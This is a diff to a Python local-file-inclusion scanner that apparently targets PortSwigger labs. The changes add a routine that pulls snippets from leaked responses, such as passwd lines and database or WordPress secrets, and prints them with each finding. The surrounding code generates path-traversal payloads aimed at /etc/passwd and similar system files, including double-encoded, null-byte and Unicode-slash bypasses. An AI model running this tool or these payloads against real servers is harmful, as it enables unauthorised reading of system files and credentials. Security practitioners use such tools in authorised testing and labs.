@@ -479,7 +479,6 @@ class PayloadGenerator:
         return list(variants)
     
     def generate_specific_lab_bypasses(self) -> List[str]:
-        """Specific payloads for PortSwigger labs and common scenarios"""
         payloads = set()
         
         for target in ["/etc/passwd", "/etc/hosts", "/etc/hostname", "/etc/issue"]:
@@ -590,19 +589,15 @@ class PayloadGenerator:
         elif self.intensity == "normal":
             filter_chains = filter_chains[:15]
         
-        # ==== PHASE 1: High-priority lab bypasses ====
         yield from self.generate_specific_lab_bypasses()
         
-        # ==== PHASE 2: Null byte bypasses for all targets ====
         for target in file_targets:
             yield from self.generate_null_byte_bypasses(target)
         
-        # ==== PHASE 3: Extension stripping bypasses ====
         if self.intensity in ["aggressive", "normal"]:
             for target in file_targets:
                 yield from self.generate_extension_stripping_bypasses(target)
         
-        # ==== PHASE 4: Direct file targets with simple traversals ====
         for target in file_targets:
             yield target
             yield f"....//....//....//....//{target}"
@@ -610,7 +605,6 @@ class PayloadGenerator:
             yield f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{target}"
             yield f"..%2f..%2f..%2f..%2f{target}"
         
-        # ==== PHASE 5: Traversal and encoding variants ====
         for target in file_targets:
             path_variants = self.generate_path_variants(target)
             double_encoded = self.generate_double_encoding_variants(target)
@@ -642,7 +636,6 @@ class PayloadGenerator:
                     else:
                         yield wrapper
         
-        # ==== PHASE 6: Additional aggressive bypasses ====
         if self.intensity == "aggressive":
             for target in file_targets:
                 yield f"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f{target}"
@@ -729,6 +722,58 @@ class ResponseAnalyzer:
         return None
     
     @staticmethod
+    def extract_content_snippet(content: str, max_lines: int = 3, max_chars: int = 150) -> Optional[str]:
+        """Extract a relevant snippet from the response content for quick identification"""
+        if not content:
+            return None
+        
+        lines = content.split('\n')
+        relevant_lines = []
+        
+        for line in lines:
+            # Skip empty lines and HTML tags
+            line = line.strip()
+            if not line:
+                continue
+            
+            # Clean HTML tags for display
+            clean_line = re.sub(r'<[^>]+>', '', line).strip()
+            if not clean_line:
+                continue
+            
+            # Look for lines containing common file content patterns
+            if any(pattern in clean_line for pattern in [
+                'root:', 'daemon:', 'bin:', 'nobody:', 'www-data:',
+                'x:0:0', 'x:1:1', 'x:2:2',
+                '127.0.0.1', 'localhost', 'Volume Serial',
+                'DB_PASSWORD', 'DB_USER', 'DB_NAME', 'DB_HOST',
+                'AUTH_KEY', 'SECURE_AUTH', 'WP_HOME',
+                'uid=', 'gid=', 'PHP Version',
+                '[', 'ServerRoot', 'DocumentRoot',
+                'DOCUMENT_ROOT', 'SERVER_ADMIN',
+                'carlos:', '/bin/bash', '/bin/sh',
+                'listen', 'ServerName'
+            ]):
+                relevant_lines.append(clean_line)
+            
+            if len(relevant_lines) >= max_lines:
+                break
+        
+        if relevant_lines:
+            snippet = ' | '.join(relevant_lines)
+            if len(snippet) > max_chars:
+                snippet = snippet[:max_chars-3] + '...'
+            return snippet
+        
+        # If no specific patterns found, return first non-empty line
+        for line in lines:
+            clean_line = re.sub(r'<[^>]+>', '', line).strip()
+            if clean_line and len(clean_line) > 10:
+                return clean_line[:max_chars]
+        
+        return None
+    
+    @staticmethod
     def analyze_base64_content(content: str) -> Tuple[Optional[str], Optional[str]]:
         try:
             cleaned = ''.join(content.split())
@@ -779,7 +824,8 @@ class ResponseAnalyzer:
             'vulnerability_type': None,
             'confidence': 0.0,
             'details': {},
-            'indicators_found': []
+            'indicators_found': [],
+            'content_snippet': None
         }
         
         if not content:
@@ -802,6 +848,10 @@ class ResponseAnalyzer:
             result['vulnerability_type'] = vuln_type
             result['confidence'] = max(result['confidence'], 0.8)
             result['details']['base64_decoded'] = decoded[:500]
+            result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(decoded)
+        
+        if not result['content_snippet']:
+            result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(content)
         
         php_errors = ResponseAnalyzer.analyze_php_errors(content)
         if php_errors:
@@ -828,6 +878,7 @@ class Finding:
     confidence: float
     details: Dict = None
     url: str = ""
+    content_snippet: str = ""
     
     def __post_init__(self):
         if self.details is None:
@@ -920,7 +971,8 @@ class LFIScanner:
                     'confidence': finding.confidence,
                     'payload': finding.payload,
                     'url': finding.url,
-                    'details': finding.details
+                    'details': finding.details,
+                    'content_snippet': finding.content_snippet
                 })
             
             with open(self.output_file, 'w') as f:
@@ -976,10 +1028,15 @@ class LFIScanner:
                         self.doc_root = analysis['details']['php_errors']['possible_doc_root']
                         print(f"\n\033[94m[*] Possible document root: {self.doc_root}\033[0m")
             
+            # Verbose output with content snippet
             if self.verbose:
                 if analysis['confidence'] > 0.3:
+                    snippet_info = ""
+                    if analysis.get('content_snippet'):
+                        snippet_info = f"\033[90m | Content: {analysis['content_snippet']}\033[0m"
+                    
                     print(f"\n\033[90m[*] {payload[:60]} | {response.status_code} | "
-                          f"{analysis['vulnerability_type']} | {analysis['confidence']:.2f}\033[0m")
+                          f"{analysis['vulnerability_type']} | {analysis['confidence']:.2f}{snippet_info}\033[0m")
             
             if analysis['vulnerability_type'] and analysis['confidence'] > 0.6:
                 with self.lock:
@@ -988,12 +1045,16 @@ class LFIScanner:
                         vuln_type=analysis['vulnerability_type'],
                         confidence=analysis['confidence'],
                         details=analysis['details'],
-                        url=full_url
+                        url=full_url,
+                        content_snippet=analysis.get('content_snippet', '')
                     )
                     self.findings.append(finding)
                     
                     color = "\033[92m" if analysis['confidence'] > 0.8 else "\033[93m"
-                    print(f"\n{color}[+] {finding.vuln_type} -> {payload}\033[0m")
+                    snippet_str = ""
+                    if finding.content_snippet:
+                        snippet_str = f"\n\033[96m   Content: {finding.content_snippet}\033[0m"
+                    print(f"\n{color}[+] {finding.vuln_type} -> {payload}{snippet_str}\033[0m")
         
         except Exception as e:
             if self.verbose:
@@ -1075,6 +1136,8 @@ class LFIScanner:
         if self.findings:
             for f in self.findings:
                 print(f"{f.vuln_type}: {f.payload}")
+                if f.content_snippet:
+                    print(f"  Content: {f.content_snippet}")
         else:
             print("\n\033[91m[-] No vulnerabilities found\033[0m")
 
